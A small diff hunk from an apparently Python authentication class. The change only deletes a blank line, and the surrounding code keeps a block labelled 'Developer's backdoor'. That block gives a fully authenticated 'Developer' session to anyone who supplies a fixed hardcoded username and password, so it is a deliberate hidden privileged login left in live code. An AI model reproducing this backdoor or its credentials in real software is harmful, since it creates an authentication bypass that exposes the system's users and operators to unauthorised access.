@@ -82,7 +82,6 @@ class Authenticator:
             ##############################################
             ######Developer's backdoor
             if username == 'skinnerfan' and password == 'monstastriper':
-                
                 self.__client = ServerClient("Developer",
                                              self.__request.session,
                                              authenticated=True)
